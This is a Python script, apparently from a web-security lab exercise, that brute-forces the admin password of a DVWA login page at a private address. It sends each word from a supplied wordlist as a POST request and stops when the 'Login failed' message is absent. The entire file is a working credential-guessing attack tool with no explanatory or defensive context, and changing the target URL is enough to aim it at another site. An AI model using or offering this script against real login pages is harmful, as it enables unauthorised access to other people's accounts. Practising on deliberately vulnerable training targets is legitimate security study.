#!/usr/bin/env python

import requests, argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-w", "--wordlist", dest="wordlist", help="Path to wordlist")
    options = parser.parse_args()
    if not options.wordlist:
        # handle error
        parser.error("[-] Please specify a wordlist path, use --help for more info")
    return options

options = get_arguments()

target_url = "http://10.0.2.11/dvwa/login.php"
data = {"username": "admin", "password": "", "Login": "submit"}

with open(options.wordlist, "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data["password"] = word
        response = requests.post(target_url, data=data)
        if "Login failed" not in response.content:
            print("[+] Success! -- " + word)
            exit()

print("[-] No Password Found.")
